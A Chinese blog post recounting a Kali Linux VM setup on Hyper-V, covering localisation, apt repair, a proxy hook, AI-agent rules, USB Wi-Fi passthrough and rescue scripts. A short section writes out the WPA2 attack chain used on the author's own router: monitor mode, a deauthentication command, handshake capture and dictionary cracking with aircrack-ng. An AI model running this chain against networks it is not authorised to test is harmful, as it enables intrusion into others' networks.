---
title: "我在 Windows 上搭了一台\"会自己救自己\"的 Kali：一次完整的技术复盘"
date: 2026-09-04
categories: [折腾]
tags: []
---

<blockquote>
<p>从一块 17.9GB 的镜像文件开始，到一台能自动接无线网卡、能被自然语言驱动、图形界面卡死还能远程自救的渗透实验环境。<br>全程真实踩坑，所有敏感信息已脱敏，仅涉及自有设备与授权测试。</p>
</blockquote>
<hr>
<h2 id="这个项目要解决什么问题">这个项目要解决什么问题</h2><p>三个朴素的需求：</p>
<ol>
<li>在 Windows 工作机上跑一台 Kali 虚拟机</li>
<li>虚拟机要能用上真实的 USB 无线网卡（做无线安全测试）</li>
<li>我 Linux 命令不熟，想让 AI 把中文需求翻译成命令，边用边学</li>
</ol>
<p>听起来都不难。实际做完发现，这三条路上的坑，一个比一个深。</p>
<h2 id="第一阶段：让-Kali-在-Hyper-V-里活起来">第一阶段：让 Kali 在 Hyper-V 里活起来</h2><h3 id="WSL2-装过，不等于有-Hyper-V">WSL2 装过，不等于有 Hyper-V</h3><p>这是第一个认知刷新：WSL2 只需要”虚拟机平台”组件，<strong>它不等于完整的 Hyper-V</strong>。完整的角色要自己开：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism /Online /Enable-Feature /FeatureName:Microsoft-Hyper-V /All /NoRestart</span><br></pre></td></tr></table></figure>

<p>必须重启，vmms 服务和 PowerShell 模块才会出现。</p>
<p>这里踩了个很阴的坑：用提权方式执行脚本时，命令里嵌套引号加输出重定向会被吞掉——<strong>脚本静默失败，日志是空的，你以为成功了其实什么都没发生</strong>。</p>
<blockquote>
<p>教训：提权跑复杂脚本，一律写成独立 .ps1 文件用 -File 调用，日志在脚本内部落盘。</p>
</blockquote>
<h3 id="官方脚本建机，但权限是个坑">官方脚本建机，但权限是个坑</h3><p>Kali 官方镜像自带建机脚本，一条命令完事。但打开控制台就报”权限不足”——因为虚拟机是在管理员会话里创建的。</p>
<p>解法是把自己加进 <code>Hyper-V Administrators</code> 组，<strong>然后必须注销重登录</strong>。</p>
<h3 id="汉化：一个-Ubuntu-惯害的坑">汉化：一个 Ubuntu 惯害的坑</h3><p>第一反应装 <code>language-pack-zh-hans</code>——<strong>查无此包</strong>。这是 Ubuntu 专属包，Kali 基于 Debian，根本没有。</p>
<p>正确姿势：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y fonts-noto-cjk locales</span><br><span class="line">sudo sed -i &#x27;s/^# *zh_CN.UTF-8/zh_CN.UTF-8/&#x27; /etc/locale.gen</span><br><span class="line">sudo locale-gen</span><br><span class="line">sudo update-locale LANG=zh_CN.UTF-8</span><br></pre></td></tr></table></figure>

<p>中间还遇到 <code>locale-gen zh_CN.UTF-8</code> 参数被静默忽略、只生成英文 locale 的怪事——最后靠手动改配置文件解决。</p>
<h3 id="2-5GB-大升级翻车，apt-半残">2.5GB 大升级翻车，apt 半残</h3><p>Kali rolling 一周不更就是 1100+ 个包。升级到末尾两个包下载失败（镜像站 IPv6 解析问题），而 apt 的行为是：<strong>下载阶段有任何失败，整个配置阶段就不执行</strong>。</p>
<p>于是系统停在”一半解包、一半没配置”的状态，之后装任何新包都报依赖错误，util-linux 卡死在两个版本之间。</p>
<p>修复链必须按顺序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --configure -a</span><br><span class="line">sudo apt --fix-broken install -y</span><br><span class="line">sudo apt full-upgrade -y</span><br></pre></td></tr></table></figure>

<p>顺便回答一个很多人问的问题：<strong>加内存加 CPU 能不能快点？不能。</strong> apt 是单线程串行的，瓶颈在 dpkg 逐个解包配置，跟硬件无关。</p>
<h3 id="代理：让虚拟机的流量出海">代理：让虚拟机的流量出海</h3><p>思路：Default Switch 是 NAT，<strong>虚拟机的默认网关就是宿主机</strong>，所以代理地址就是网关地址。</p>
<p>三个要点：v2rayN 要开”允许局域网连接”；新版只有一个混合端口（socks+http 同端口）；防火墙放行要写整个私网段——因为 <strong>Default Switch 每次重启随机换网段</strong>。</p>
<p>最后写了个 NetworkManager 钩子：每次网络变化自动探测网关、检测代理可达才写配置，v2rayN 没开就自动清掉。<strong>一次配置，IP 怎么变都不用管。</strong></p>
<h2 id="第二阶段：让-AI-驱动这台机器">第二阶段：让 AI 驱动这台机器</h2><h3 id="Gemini-CLI：授权成功，但被关门了">Gemini CLI：授权成功，但被关门了</h3><p>先试 Gemini CLI，OAuth 授权一路成功，然后服务端拒绝：</p>
<blockquote>
<p>This client is no longer supported for Gemini Code Assist for individuals.</p>
</blockquote>
<p>查了才知道，个人免费通道已经关闭，官方让迁移去新产品。<strong>授权成功也没用，门在服务端焊死了。</strong></p>
<h3 id="qwen-code：好用，但中文打不进去">qwen-code：好用，但中文打不进去</h3><p>换成阿里的 qwen-code，免费额度够用，但卡在一个诡异的问题上：<strong>终端里死活打不了中文</strong>，图形程序里一切正常。</p>
<p>根因：这类 CLI 工具用 raw 模式逐键读键盘，直接打断了输入法的组合输入流程。换终端模拟器也没用。</p>
<p>最后换了个思路——<strong>别在终端较劲，用图形界面</strong>：</p>
<ul>
<li><strong>VS Code + Cline 插件</strong>：图形程序，中文输入天然正常；agent 模式能读意图、调内置终端执行命令、读输出继续下一步</li>
</ul>
<p>真正高收益的操作是写了一份 <code>.clinerules</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 环境</span><br><span class="line">- Kali，Hyper-V 虚拟机，我是 Linux 命令初学者，全程中文</span><br><span class="line"></span><br><span class="line"># 工作方式</span><br><span class="line">1. 我用自然语言描述目标，你翻译成命令</span><br><span class="line">2. 执行任何命令前，先用一行中文解释它做什么</span><br><span class="line">3. 危险操作先列风险等我确认</span><br><span class="line">4. 每次任务结束，把用到的命令按主题追加到笔记文件</span><br></pre></td></tr></table></figure>

<p>这份文件每次对话自动加载。<strong>第 2 条保安全，第 4 条让 AI 自动帮你攒一本私人命令手册</strong>——用两周，那本笔记比任何教程都贴合你的实际使用。</p>
<h2 id="第三阶段：无线网卡，全程最深的水">第三阶段：无线网卡，全程最深的水</h2><h3 id="先说残酷事实">先说残酷事实</h3><p><strong>Hyper-V 不支持 USB 直通，也不支持把内置网卡共享给虚拟机。</strong> 虚拟机里天生没有任何无线接口。</p>
<p>唯一出路：微软官方的 usbipd-win，把 USB 设备通过网络”递”进虚拟机。</p>
<h3 id="五个坑，按踩的顺序">五个坑，按踩的顺序</h3><p><strong>坑 1：Windows 断网了。</strong> 第一次接入成功后宿主机直接断网——因为那块网卡就是 Windows 上网用的。<strong>接入是独占的</strong>。后来插了第二块网卡才分工明确：AIC8800D80 给 Windows 上网，RTL8188EU 给 Kali 测试。</p>
<p><strong>坑 2：芯片选错了。</strong> AIC8800D80 是国产小众芯片，Linux 内核没驱动。而 <strong>RTL8188EU 是渗透圈经典入门卡</strong>——内核自带驱动（注意驱动名是 <code>rtl8xxxu</code> 不是 <code>r8188eu</code>），监听和注入都有支持。</p>
<p><strong>坑 3：固件启动失败。</strong> 设备进来了，驱动认出来了，固件加载报 -11。固件文件明明存在。最后发现解法朴素得离谱：<strong>物理拔插一次，重新接入，就好了</strong>。</p>
<p><strong>坑 4：注入测试误判。</strong> 广播探测测试显示”无注入”，差点否掉这张卡。实际上<strong>广播探测本来就不该有回应，必须带目标定向测试</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -9 -e &quot;SSID&quot; -b BSSID wlan0</span><br><span class="line">→ Injection is working!  30/30: 100%</span><br></pre></td></tr></table></figure>

<p><strong>坑 5：用完之后托盘里没有 WiFi 了。</strong> 接口残留监听模式（<code>ip link</code> 里能看到 radiotap 字样），而 <strong>NetworkManager 会主动忽略监听模式的接口</strong>。新版 aircrack-ng 也不再重命名接口，stop 之后状态经常残留。</p>
<h3 id="战果：完整的-WPA2-审计链路">战果：完整的 WPA2 审计链路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0                 # 进监听模式</span><br><span class="line">aireplay-ng -0 5 -a BSSID wlan0       # 踢客户端下线，逼它重连握手</span><br><span class="line">airodump-ng -w cap -c 8 --bssid ...   # 抓包，看到 WPA handshake 即成功</span><br><span class="line">aircrack-ng -w 字典 cap-01.cap        # 破解</span><br></pre></td></tr></table></figure>

<p>结果：<strong>测试了 2 个字典词、0.1 秒，密码出来了。</strong></p>
<p>因为我家路由器密码是 8 位纯数字日期格式。也就是说，任何人在楼下，几秒钟就能进我的网络。</p>
<p><strong>这条链路对我最大的价值不是攻击，是把自己家的洞补上了。</strong> 当天就改成了强密码。</p>
<h2 id="第四阶段：把一切自动化（包括救它自己）">第四阶段：把一切自动化（包括救它自己）</h2><h3 id="日常自动化">日常自动化</h3><p>开机自动接无线网卡，做成了 systemd 服务，带三重保险：</p>
<ul>
<li>等默认路由出现（最多 60 秒）</li>
<li><strong>遍历所有默认网关逐个尝试</strong>（虚拟机多网卡时只取第一条会取错）</li>
<li>失败自动重启服务重试</li>
</ul>
<p>再配两条别名：<code>wifimon</code> 进监听模式，<code>wifinorm</code> 恢复正常。</p>
<p>顺手把内存从”动态内存”改成<strong>固定 4GB</strong>——动态内存在 Linux 客户机里靠 balloon 驱动伸缩，宿主有压力时会造成 I&#x2F;O 停顿，怀疑正是图形界面卡死的诱因之一。</p>
<h3 id="救援体系：图形界面卡死怎么办">救援体系：图形界面卡死怎么办</h3><p>这个环境用下来，Xfce 图形界面卡死过好几次（内核活着、桌面死了）。救援的阶梯是：</p>
<p><strong>第 1 级：SSH 远程重启图形界面</strong>（最理想，只丢桌面会话）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh kali@ &quot;sudo systemctl restart lightdm&quot;</span><br></pre></td></tr></table></figure>

<p>配套：免密 SSH + 定向的 sudo 免密规则（只放行 lightdm&#x2F;NetworkManager 等几个重启命令，不是全局放开）。</p>
<p><strong>第 2 级：优雅关机再开机。</strong></p>
<p><strong>第 3 级：硬断电。</strong> 这里有个反直觉的知识点：<strong><code>Stop-VM -Force</code> 不是硬关机</strong>，-Force 只是跳过确认，关机方式仍是优雅的。真正的断电是 <code>-TurnOff</code>。</p>
<p>而卡死的系统连优雅关机都完成不了，VM 会 wedge 在 Stopping 状态，所有电源操作报错。解法是<strong>重启 vmms 服务解开死锁</strong>，再硬断电。</p>
<p>最后把整个阶梯做成了一键脚本：查心跳 → 没运行就开机 → 心跳异常直接跳断电 → SSH 重启图形界面 → 优雅关机 → 解死锁硬断电 → 还不行就打印 VM 的 GUID 让你手动杀工作进程（<code>vmwp.exe</code> 的命令行里带 GUID，能精确定位，不会误杀 WSL2）。</p>
<p>实测有效。一次真实的卡死，脚本走完全程，机器自己回来了。</p>
<h3 id="脚本本身也是坑里爬出来的">脚本本身也是坑里爬出来的</h3><ul>
<li>写 PowerShell 脚本带中文注释，<strong>必须存 UTF-8 with BOM</strong>——Windows PowerShell 5.1 默认按 ANSI 读，中文被错误解码后直接语法报错</li>
<li>图形界面卡死时，Hyper-V 的 KVP 组件<strong>恰好也不会上报虚拟机 IP</strong>——最需要救援的时刻拿不到 IP。解法是平时把最后已知 IP 缓存下来，卡死时用缓存连</li>
</ul>
<h2 id="复盘：最值得记住的七条">复盘：最值得记住的七条</h2><ol>
<li><strong>WSL2 ≠ Hyper-V</strong>，完整角色要单独启用并重启</li>
<li><strong>apt 下载失败会留半安装状态</strong>，锁死依赖树；修复按 <code>dpkg --configure -a → -f install → full-upgrade</code> 顺序</li>
<li><strong>虚拟机抢 USB 网卡前，先确认宿主机有另一条上网路径</strong></li>
<li><strong>工具报错不一定是配置错</strong>，可能只是测试方法不对（注入测试必须定向）</li>
<li><strong>别在终端 TUI 上跟输入法较劲</strong>，图形界面 + agent 是更聪明的选择</li>
<li><strong>凡是每次都要重跑的操作，做成 systemd 服务或别名</strong>，一次配置永久收益</li>
<li><strong>PowerShell 脚本带中文，存 UTF-8 with BOM</strong>；<code>Stop-VM -Force</code> 不是硬关机，<code>-TurnOff</code> 才是</li>
</ol>
<h2 id="这台机器现在的样子">这台机器现在的样子</h2><ul>
<li>中文系统 + 拼音输入法</li>
<li>开机自动接无线网卡，托盘直接连 WiFi</li>
<li>代理自动跟随宿主机，IP 变了不用管</li>
<li>VS Code + AI agent 自然语言驱动，自动攒命令笔记</li>
<li>无线监听 + 注入 100% 可用</li>
<li>图形界面卡死时，Windows 侧双击一个脚本完成救援</li>
</ul>
<p>从裸镜像到这套东西，断断续续两天。中间十几个坑全部定位到根因，并且每一个都沉淀成了自动化、脚本或者笔记。</p>
<hr>
<blockquote>
<p>最后强调边界：本文所有操作都在自己的虚拟机、自己的路由器上完成。<br>对他人网络抓包、破解，在国内属于明确的刑事风险，与技术水平无关。<br>想练手，TryHackMe、Hack The Box、VulnHub 有的是合法靶场。</p>
</blockquote>
